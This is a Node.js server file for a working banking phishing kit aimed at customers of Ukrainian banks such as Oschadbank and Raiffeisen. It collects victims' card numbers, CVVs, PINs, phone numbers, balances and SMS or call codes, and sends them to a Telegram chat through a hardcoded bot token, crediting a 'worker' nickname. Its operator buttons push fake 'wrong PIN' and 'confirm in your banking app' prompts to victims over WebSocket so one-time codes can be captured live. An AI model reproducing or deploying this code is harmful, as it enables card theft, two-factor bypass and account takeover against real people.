const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// –ù–ê–°–¢–†–û–ô–ö–ò
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';

// –î–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ WEBHOOK_URL –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ç–µ–∫—É—â–µ–≥–æ —Ö–æ—Å—Ç–∞
const getWebhookUrl = () => {
    const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
    const host = process.env.HOST || 'localhost';
    const port = process.env.PORT || 3000;
    return `${protocol}://${host}:${port}/bot${TELEGRAM_BOT_TOKEN}`;
};
const WEBHOOK_URL = getWebhookUrl();

// –°–ü–ò–°–û–ö –ë–ê–ù–ö–û–í –î–õ–Ø –ö–ù–û–ü–ö–ò "–ó–ê–ü–†–û–°"
const banksForRequestButton = [
    '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω', '–ê–ª—å—è–Ω—Å', '–ü–£–ú–ë', 'OTP Bank',
    '–í–æ—Å—Ç–æ–∫', 'Izibank', '–£–∫—Ä—Å–∏–±'
];

const app = express();
app.use(express.json());
app.use(cors());

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–ø—Ä–æ—Å–æ–≤
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

// –û–±—Å–ª—É–∂–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –∏–∑ –∫–æ—Ä–Ω—è
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// –£—Å—Ç–∞–Ω–æ–≤–∫–∞ webhook —Å –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–º URL
bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook set to ${WEBHOOK_URL}`);
}).catch(err => {
    console.error('Error setting webhook:', err);
});

// –¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
bot.sendMessage(CHAT_ID, '–ü–†–û–ï–ö–¢ –£–°–ü–ï–®–ù–û –°–¢–ê–õ –ù–ê –°–ï–†–í–ï–†! –•–æ—Ä–æ—à–µ–≥–æ –≤–æ—Ä–∫–∞! –¢–µ—Å—Ç –æ—Ç ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

// –¢–µ—Å—Ç –±–æ—Ç–∞
bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

// Webhook –¥–ª—è Telegram
app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('Error processing message:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    if (newData.call_code_input) {
        let message = '<b>üîî –û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–¥ —ñ–∑ –¥–∑–≤—ñ–Ω–∫–∞ (–û—â–∞–¥–±–∞–Ω–∫)!</b>\n\n';
        message += '<b>–ö–æ–¥:</b> <code>' + newData.call_code_input + '</code>\n';
        message += '<b>–°–µ—Å—ñ—è:</b> <code>' + sessionId + '</code>\n';
        message += '<b>Worker:</b> @' + workerNick + '\n';
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }

        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = '<b>–ù–æ–≤–∏–π –∑–∞–ø–∏—Å!</b>\n\n';
        message += '<b>–ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ' + newData.bankName + '\n';
        message += '<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>' + (newData.phone || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ') + '</code>\n';
        message += '<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>' + (newData.card_confirm || newData.card || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ') + '</code>\n';
        if (newData['card-expiry']) message += '<b>–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó:</b> <code>' + newData['card-expiry'] + '</code>\n';
        if (newData['card-cvv']) message += '<b>CVV:</b> <code>' + newData['card-cvv'] + '</code>\n';
        message += '<b>–ü—ñ–Ω:</b> <code>' + (newData.pin || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ') + '</code>\n';
        if (newData.balance) message += '<b>–ü–æ—Ç–æ—á–Ω–∏–π –±–∞–ª–∞–Ω—Å:</b> <code>' + newData.balance + '</code>\n';
        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} —Ä–∞–∑`;
        message += '<b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤:</b> ' + visitText + '\n';
        message += '<b>Worker:</b> @' + workerNick + '\n';

        sendToTelegram(message, sessionId, newData.bankName);
    }

    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    console.log('API /sms:', req.body);
    const { sessionId, code, referrer } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`SMS for ${sessionId}: code=${code}`);
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = '<b>–û—Ç—Ä–∏–º–∞–Ω–æ SMS!</b>\n\n';
        message += '<b>–ö–æ–¥:</b> <code>' + code + '</code>\n';
        message += '<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>' + sessionData.phone + '</code>\n';
        message += '<b>–°–µ—Å—ñ—è:</b> <code>' + sessionId + '</code>\n';
        message += '<b>Worker:</b> @' + workerNick + '\n';
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: '–î–û–î–ê–¢–û–ö', callback_data: `app:${sessionId}` }
        ],
        [
            { text: '–ü–Ü–ù', callback_data: `pin_error:${sessionId}` },
            { text: '–ö–û–î', callback_data: `code_error:${sessionId}` },
            { text: '–ö–û–î ‚úÖ', callback_data: `timer:${sessionId}` }
        ],
        [
            { text: '–ö–∞—Ä—Ç–∞', callback_data: `card_error:${sessionId}` },
            { text: '–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` }
        ],
        [
            { text: 'OTHER', callback_data: `other:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[0].push({ text: '–ó–ê–ü–†–û–°', callback_data: `request_details:${sessionId}` });
    }

    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};

        switch (type) {
            case 'sms':
                commandData = { text: "–í–∞–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ SMS –∑ –∫–æ–¥–æ–º –Ω–∞ –º–æ–±—ñ–ª—å–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, –≤–≤–µ–¥—ñ—Ç—å –π–æ–≥–æ —É —Ñ–æ—Ä–º—É –≤–≤–æ–¥—É –∫–æ–¥—É" };
                break;
            case 'app':
                commandData = { text: "–í–∞–º –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —É –¥–æ–¥–∞—Ç–æ–∫ –º–æ–±—ñ–ª—å–Ω–æ–≥–æ –±–∞–Ω–∫—É. –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–æ–¥–∞—Ç–æ–∫ –±–∞–Ω–∫—É —Ç–∞ –∑—Ä–æ–±—ñ—Ç—å –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –¥–ª—è –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó." };
                break;
            case 'other':
                commandData = { text: "–í –Ω–∞—Å –Ω–µ –≤–∏–π—à–ª–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –≤–∞—à—É –∫–∞—Ä—Ç–∫—É. –î–ª—è –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è –ø—Ä–æ–ø–æ–Ω—É—î–º–æ –≤–∫–∞–∑–∞—Ç–∏ –∫–∞—Ä—Ç–∫—É —ñ–Ω—à–æ–≥–æ –±–∞–Ω–∫—É" };
                break;
            case 'pin_error':
                commandData = { text: "–í–∏ –≤–∫–∞–∑–∞–ª–∏ –Ω–µ–≤—ñ—Ä–Ω–∏–π –ø—ñ–Ω–∫–æ–¥. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –≤—ñ—Ä–Ω–∏–π –ø—ñ–Ω–∫–æ–¥" };
                break;
            case 'card_error':
                commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ–≤—ñ—Ä–Ω–∏–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞–∑–∞–¥ —Ç–∞ –≤–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏ –≤—ñ—Ä–Ω–æ" };
                break;
            case 'number_error':
                commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ —Ñ—ñ–Ω–∞–Ω—Å–æ–≤–∏–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –Ω–æ–º–µ—Ä —è–∫–∏–π –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π –¥–æ –≤–∞—à–æ—ó –∫–∞—Ä—Ç–∫–∏." };
                break;
            case 'request_details':
                commandData = { isRaiffeisen: sessions.get(sessionId)?.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω' };
                break;
        }

        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `–ö–æ–º–∞–Ω–¥–∞ "${type}" –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: '–ü–æ–º–∏–ª–∫–∞: –∫–ª—ñ—î–Ω—Ç –Ω–µ –≤ –º–µ—Ä–µ–∂—ñ!', show_alert: true });
    }
});

bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ message: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, process.env.HOST || '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT} with host ${process.env.HOST || '0.0.0.0'}`);
});
